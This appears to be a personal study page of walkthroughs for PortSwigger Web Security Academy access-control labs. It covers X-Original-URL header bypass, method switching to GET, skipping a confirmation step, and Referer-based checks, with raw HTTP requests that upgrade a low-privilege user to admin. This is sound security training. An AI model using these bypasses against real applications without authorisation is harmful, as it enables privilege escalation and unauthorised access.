---
layout: default
title: "Access Control"
parent: "Web Application"
nav_order: 2
---


### Lab: URL-based access control can be circumvented
Test that you are able to use the `X-Original-URL` header by adding it
- Change the URL in the request line to `/` and add the HTTP header `X-Original-URL: /invalid`
	- The fact that you get a "not found" response means that it has been processed
- Change the `X-Original-URL` value to `/admin` and see that you can access the admin page
- Change the query string to `/?username=carlos` and the `X-Original-URL` header to `/admin/delete`
	- *In practice I expect this will require some figuring out*


### Lab: Method-based access control can be circumvented
- Login with admin credentials to check things out
- Login with `wiener` and see your session cookie
- Go back to request where you can see how to upgrade a user and substitute the `wiener` cookies
	- It won't work
- Change to `GET` request and notice that you get `"Missing parameter 'username'"` even though these exist in the `POST` request
- Change endpoint to `GET /admin-roles?username=wiener&action=upgrade` using the `wiener` cookies
- ***Basically try changing to a `GET` request and then adding the parameters you want to the endpoint you request***


### Lab: Multi-step process with no access control on one step
Same as above, but there is an additional confirmation of the upgrade request. It looks like this:

```HTTP
GET /admin-roles?username=wiener&action=upgrade&confirm=true HTTP/2
Host: 0a07005f04faa7ed813266070094008a.web-security-academy.net
Cookie: session=FF3X0qJ2qgfrQoR8shLOuaPnfGssIL95
Content-Length: 45
Cache-Control: max-age=0
Sec-Ch-Ua: "Not(A:Brand";v="8", "Chromium";v="144"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Origin: https://0a07005f04faa7ed813266070094008a.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

...

action=upgrade&confirmed=true&username=wiener
```
Note that the last part isn't actually necessary bc it's at the top

### Lab: Referer-based access control
Kind of a weird one bc you can just send the request as admin and then change the session cookie to that of the `wiener` user. It's already a `GET` request, and the parameters are already in the URL. :

```HTTP
GET /admin-roles?username=wiener&action=upgrade HTTP/2
Host: 0a2e00ad0492a7d181ef7a7100d70084.web-security-academy.net
Cookie: session=OQm4SyaEUUedVGRWXZdUD49wOFqyH1c9
...
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
...
Referer: https://0a2e00ad0492a7d181ef7a7100d70084.web-security-academy.net/admin
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

*This lab just exists to show that sometimes the referral header is used for access control.* **Note that the cookie did still need to be changed to the `wiener` user's.**

